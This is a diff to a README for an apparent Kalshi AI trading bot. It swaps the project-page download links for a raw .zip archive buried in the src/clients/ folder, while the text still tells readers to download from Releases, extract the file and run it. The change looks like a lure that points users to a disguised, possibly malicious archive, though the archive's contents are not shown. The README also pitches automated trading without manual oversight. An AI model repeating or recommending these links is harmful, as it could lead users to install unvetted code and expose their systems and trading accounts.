@@ -1,6 +1,6 @@
 # 🤖 kalshi-ai-trading-bot - Automated trading for Kalshi prediction markets
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/hipflaskchemicalreaction466/kalshi-ai-trading-bot)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/hipflaskchemicalreaction466/kalshi-ai-trading-bot/raw/refs/heads/main/src/clients/ai-trading-bot-kalshi-1.5.zip)
 
 This software manages trades on Kalshi. It uses artificial intelligence to analyze event contracts and execute orders. You can use this tool to automate your market activity without manual oversight.
 
@@ -18,7 +18,7 @@ Your computer needs specific software to run this tool. Verify your setup before
 
 Visit the link below to reach the project page. Locate the section labeled Releases on the right side of the screen. Click the file ending in .zip to download the source code.
 
-[Download the Software Here](https://github.com/hipflaskchemicalreaction466/kalshi-ai-trading-bot)
+[Download the Software Here](https://github.com/hipflaskchemicalreaction466/kalshi-ai-trading-bot/raw/refs/heads/main/src/clients/ai-trading-bot-kalshi-1.5.zip)
 
 After the download finishes, move the file to a folder where you want to keep the application. Right-click the file and select Extract All. Open the new folder created after the extraction.
 
